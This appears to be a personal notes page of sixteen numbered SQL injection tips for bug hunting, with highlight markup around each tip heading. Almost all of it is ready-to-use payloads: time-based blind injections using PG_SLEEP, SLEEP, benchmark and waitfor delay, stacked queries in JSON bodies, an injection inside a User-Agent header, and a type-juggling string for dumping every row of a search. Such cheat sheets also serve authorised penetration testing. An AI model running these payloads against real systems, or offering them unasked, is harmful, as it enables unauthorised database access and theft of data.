<mark style="background: #FF5582A6;">Tip 1:-</mark>
-->`https://example.com/dnt?level=stansard&region=gcp-us-central` --> here region parameter is vulnerable to SQLI.

<mark style="background: #FF5582A6;">Tip 2:-</mark>
-> Look for id parameter like {"id:"test12","password":"hellowordl"} also password parameter also

<mark style="background: #FF5582A6;">Tip 3:-</mark>
In mysql database --> `[https://example.com/employee/search/?name={keyword_here}]` if we give `0` number zero then it can give all the data. And query except the string so we use `?name='x'+0+'x'` which will be interepted as number zero due to data type differences.

<mark style="background: #FF5582A6;">Tip 4:-</mark>
Try Sqli on HTTP headers that stored on server like Cookies, UserAgent, maybe Referer, Origin and other custom headers.

<mark style="background: #FF5582A6;">Tip 5:-</mark>
-> inject blind sqli on login page like `admin');SELECT PG_SLEEP(5)--` or `?attachment_id=123" AND 4564=(SELECT 4564 FROM PG_SLEEP(11)) OR "04586"="4586--`

<mark style="background: #FF5582A6;">Tip 6:-</mark>
-> get urls and parameters from waybackmachine and test for sqli if `'` and `"` doesnt give error, also try for other payloads.

<mark style="background: #FF5582A6;">Tip 7:-</mark>
Time Based JSON Stacked Query SQL Injection --> `{"param":"AbcXYZ'; waitfor delay '0:0:6' --","key":"ABC1234"}`

<mark style="background: #FF5582A6;">Tip 8:-</mark>
sales_ref=[123] --> sales-ref[''''123]

<mark style="background: #FF5582A6;">Tip 9:-</mark>
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5*5),0))OR'

<mark style="background: #FF5582A6;">Tip 10:-</mark>
check sqli in -> `/id/23h23h23h` uuid part

<mark style="background: #FF5582A6;">Tip 11:-</mark>
payload ->  benchmark(1000000000,1-1)

<mark style="background: #FF5582A6;">Tip 12:-</mark>
-> if the input id is integer then we dont need `'` or `"` to terminate the sql query -> we can simply do like this -> `id=12-sleep(5)` or `id=12-benchmark(100000000000,1-1)`

<mark style="background: #FF5582A6;">Tip 13:-</mark>
`&topsort=followers+or+sleep(0.000000001)`

<mark style="background: #FF5582A6;">Tip 14:-</mark>
-> `?search=%0a` or `?search=0` or different charatcer which will throw an error 

<mark style="background: #FF5582A6;">Tip 15:-</mark>
-> `132'; waitfor delay '0:0:6' -- `

Tip 16:-
-> (SELECT(0)FROM(SELECT(SLEEP(10)))a)